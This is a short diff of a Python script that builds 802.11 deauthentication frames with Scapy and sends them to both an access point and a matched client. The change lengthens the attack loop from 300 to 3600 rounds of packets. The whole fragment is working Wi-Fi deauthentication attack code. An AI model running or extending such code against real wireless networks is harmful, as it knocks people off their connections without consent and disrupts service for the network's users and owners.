@@ -76,7 +76,7 @@ def main(interface):
 		Dot11(addr1=matching_client["AP MAC"], addr2=matching_client["CLIENT MAC"], addr3=matching_client["CLIENT MAC"])/
 		Dot11Deauth())
 
-	for i in range(60 * 5):
+	for i in range(60 * 60):
 		print(f"Send deauth #{i}...", flush=True)
 		sendp(deauth_pkt_for_ap, iface=interface)
 		sendp(deauth_pkt_for_client, iface=interface)
